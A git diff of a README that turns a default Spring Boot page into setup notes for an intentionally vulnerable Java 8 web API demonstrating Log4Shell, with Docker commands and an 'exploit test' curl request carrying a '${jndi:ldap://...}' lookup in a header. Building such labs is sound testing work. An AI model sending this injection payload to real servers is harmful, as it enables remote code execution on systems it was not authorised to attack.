@@ -1,17 +1,15 @@
-# Getting Started
+# LOG4SHELL
 
-### Reference Documentation
-For further reference, please consider the following sections:
+### Vulnerable JAVA 8 + SPRING BOOT WEB API
+#### Running the application
 
-* [Official Apache Maven documentation](https://maven.apache.org/guides/index.html)
-* [Spring Boot Maven Plugin Reference Guide](https://docs.spring.io/spring-boot/docs/2.6.8/maven-plugin/reference/html/)
-* [Create an OCI image](https://docs.spring.io/spring-boot/docs/2.6.8/maven-plugin/reference/html/#build-image)
-* [Spring Web](https://docs.spring.io/spring-boot/docs/2.6.8/reference/htmlsingle/#boot-features-developing-web-applications)
+```bash
+docker build . -t log4shell
+docker run --name log4shell -p 8080:8080 log4shell
+```
 
-### Guides
-The following guides illustrate how to use some features concretely:
-
-* [Building a RESTful Web Service](https://spring.io/guides/gs/rest-service/)
-* [Serving Web Content with Spring MVC](https://spring.io/guides/gs/serving-web-content/)
-* [Building REST services with Spring](https://spring.io/guides/tutorials/bookmarks/)
-
+#### Exploit test the application
+```bash
+curl --location --request POST 'http://localhost:8080/ping' \
+--header 'Log: ${jndi:ldap://localhost:9999}'
+```
